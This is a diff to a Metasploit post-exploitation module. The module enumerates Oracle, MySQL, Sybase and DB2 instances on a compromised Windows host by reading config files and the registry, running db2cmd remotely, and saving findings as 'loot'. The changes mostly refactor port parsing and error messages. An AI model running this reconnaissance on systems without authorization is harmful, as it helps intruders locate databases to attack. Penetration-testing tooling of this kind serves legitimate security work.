@@ -149,7 +149,7 @@ class Metasploit3 < Msf::Post
 			end
 		end
 	rescue
-		print_error("\t\t+ could not identify information")
+		print_error("\t\t! could not identify information")
 	end
 	
 	# method to identify oracle instances
@@ -165,28 +165,23 @@ class Metasploit3 < Msf::Post
 				if session.fs.file.exists?(val_ORACLE_HOME + "\\NETWORK\\ADMIN\\tnsnames.ora")
 					data_TNSNAMES = read_file(val_ORACLE_HOME + "\\NETWORK\\ADMIN\\tnsnames.ora")
 					ports = data_TNSNAMES.scan(/PORT\ \=\ (\d+)/)
-					port = 0
-					ports.each do |p|
-						if port == 0
-							port = $1
-						end
-					end
+					port = $1
 					print_good("\t\t+ #{val_ORACLE_SID} (Port:#{port})")
 					loot("oracle","instance:#{val_ORACLE_SID} port:#{port}","Oracle Database Server",port)
 				else
-					print_error("\t\t+ #{val_ORACLE_SID} (No Listener Found)")				
+					print_error("\t\t! #{val_ORACLE_SID} (No Listener Found)")				
 				end
 			end
 		end
 	rescue
-		print_error("\t\t+ could not identify information")
+		print_error("\t\t! could not identify information")
 	end
 
 	# method to identify mysql instances
 	def enumerate_mysql
 		basekey = "HKLM\\SOFTWARE\\MySQL AB"
 		instances = registry_enumkeys(basekey)
-		if  instances.nil? and not instances.empty?
+		if  instances.nil? or instances.empty?
 			return
 		end
 		instances.each do |i|
@@ -213,20 +208,15 @@ class Metasploit3 < Msf::Post
 			end
 			if found
 				ports = data.scan(/port\=(\d+)/)
-				port = 0
-				ports.each do |p|
-					if port == 0
-						port = $1
-					end
-				end
+				port = $1
 				print_good("\t\t+ MYSQL (Port:#{port})")
 				loot("mysql","instance:MYSQL port:#{port}","MySQL Server",port)
 			else
-				print_error("\t\t+ couldnt locate file.")
+				print_error("\t\t! couldnt locate file.")
 			end
 		end
 	rescue
-		print_error("\t\t+ could not identify information")
+		print_error("\t\t! could not identify information")
 	end
 	
 	# method to identify sybase instances
@@ -245,18 +235,14 @@ class Metasploit3 < Msf::Post
 				end
 			end
 			ports = segment.scan(/master\=\w+\,[^\,]+\,(\d+)/)
-			ports.each do |p|
-				if port == 0
-					port = $1
-				end
-			end		
+			port = $1
 			print_good("\t\t+ #{instance} (Port:#{port})")
 			loot("sybase","instance:#{instance} port:#{port}","Sybase SQL Server",port)
 		else
-			print_error("\t\t+could not locate configuration file.")
+			print_error("\t\t! could not locate configuration file.")
 		end
 	rescue
-		print_error("\t\t+ couldnt locate information.")
+		print_error("\t\t! couldnt locate information.")
 	end
 	
 	# method to identify db2 instances
@@ -264,13 +250,7 @@ class Metasploit3 < Msf::Post
 		cmd_i = run_cmd("db2cmd -i -w /c db2ilist")
 		cmd_p = run_cmd("db2cmd -i -w /c db2 get dbm cfg")
 		ports = cmd_p.scan(/\ ?TCP\/IP\ Service\ name[\ ]+\(SVCENAME\)\ =\ (\w+)/)
-		port = 0
-		port_t = 0
-		ports.each do |p|
-			if port == 0
-				port = $1
-			end
-		end
+		port = $1
 		windir = session.fs.file.expand_path("%windir%")
 		getfile = session.fs.file.search(windir + "\\system32\\drivers\\etc\\","services.*",recurse=true,timeout=-1)
 		data = 0
@@ -282,17 +262,15 @@ class Metasploit3 < Msf::Post
 			end
 		end
 		port_translated = data.scan(/#{port}[\ \t]+(\d+)/)
-		port_translated.each do |t|
-			if port_t == 0 
-				port_t = $1
-			end
-		end
+		port_t = $1
 		cmd_i.split("\n").compact.each do |line|
-			print_good("\t\t+ #{line.strip} (Port:#{port_t})")
-			loot("db2","instance:#{line.strip} port:#{port_t}","DB2 Server",port_t)
+			stripped=line.strip
+			print_good("\t\t+ #{stripped} (Port:#{port_t})")
+			#loot("db2","instance:#{stripped} port:#{port_t}","DB2 Server",port_t)
+			loot("db2","instance:#{stripped} port:#{port_t}","DB2 Server",port_t)
 		end
 	rescue
-		print_error("\t\t+ could not identify instances information")
+		print_error("\t\t! could not identify instances information")
 	end
 	
 	
@@ -310,23 +288,29 @@ class Metasploit3 < Msf::Post
 		process.close
 		return res
 	rescue
-		print_error("\t\t+ could not execute remote process")
+		print_error("\t\t! could not execute remote process")
 		return ""
 	end
 	
 	# this method stores the loot in a consistant format for this module, and reports on service
 	def loot(dbtype,dbdata,dbinfo,dbport)
-		rhost = sysinfo['Computer']
-		filename = "#{rhost}_#{dbtype}_database_enumeration.txt"
-		store_loot("windows.database.#{dbtype}",
+		#rhost = sysinfo['Computer']
+		filename = "#{session.sock.peerhost}_#{dbtype}_database_enumeration.txt"
+		store_loot("windows.database.instance",
 			"text/plain",
 			session,
-			"host:#{rhost} type:#{dbtype} #{dbdata}",
+			"host:#{session.sock.peerhost} type:#{dbtype} #{dbdata}",
 			filename,
 			dbinfo)
-		report_service(:host => rhost, :port => dbport, :name => dbtype, :info => "#{dbtype}, #{dbdata}")
+		report(dbport,dbtype,dbdata)
 	rescue
-		print_error("\t\t+ could not store loot")
+		print_error("\t\t! could not store loot")
 	end
 	
+	#this method simply reports the new discovered service to the services list
+	def report(dbport,dbtype,dbdata)
+		report_service(:host => session.sock.peerhost, :port => dbport, :name => dbtype, :info => "#{dbtype}, #{dbdata}")
+	rescue
+		print_error("\t\t! could not report service")
+	end
 end
